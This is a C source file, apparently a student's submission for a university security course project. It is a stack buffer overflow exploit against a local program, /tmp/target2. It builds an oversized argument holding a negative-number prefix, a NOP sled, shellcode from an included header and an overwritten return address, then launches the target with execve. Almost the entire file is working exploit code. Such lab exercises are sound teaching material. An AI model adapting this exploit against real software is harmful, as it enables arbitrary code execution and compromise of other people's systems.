/**
CS6332.501
Project 5
Submitted by Konchady Gaurav Shenoy (kxs168430)
**/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

//Value of SIZE above and below this causes Segmentation Fault.
#define SIZE 28027 
#define TARGET "/tmp/target2"

int main(int argc, char *argv[])
{
   unsigned int i, ret, offset_value = 0;
   char *args[3];
   char *env[1];
   char exploit_buffer[SIZE];
   if(argc > 1) {
      offset_value = (unsigned int) atoi(argv[1]);
   }
   ret = (unsigned int) &i - offset_value;

   sprintf(exploit_buffer,"-153390688,");

   //Bitwise operations on the buffer variable
   exploit_buffer[SIZE-4] = ret & 0xff;
   exploit_buffer[SIZE-3] = (ret >> 8) & 0xff;
   exploit_buffer[SIZE-2] = (ret >> 16) & 0xff;
   exploit_buffer[SIZE-1] = (ret >> 24) & 0xff;
   
/* for (i=0;i<SIZE;i++)
   {
     putchar(exploit_buffer[i]);
     printf(">>>>>\n");
   }*/

   printf("\n");

   //for(i=0; i<27967; i++)
   i=0;
   while(i<27967) {
      exploit_buffer[(i++)+11] = 0x90;
   }

   i=0;
   do{
      exploit_buffer[(i++)+SIZE-50] = shellcode[i];
   }while( i < strlen(shellcode ));

   args[0] = TARGET;
   args[1] = exploit_buffer;
   args[2] = env[0] = NULL;


   //The Moment of Truth
   if (0 > execve(TARGET, args, env))
      fprintf(stderr, "execve failed.\n");

   return 0;
}
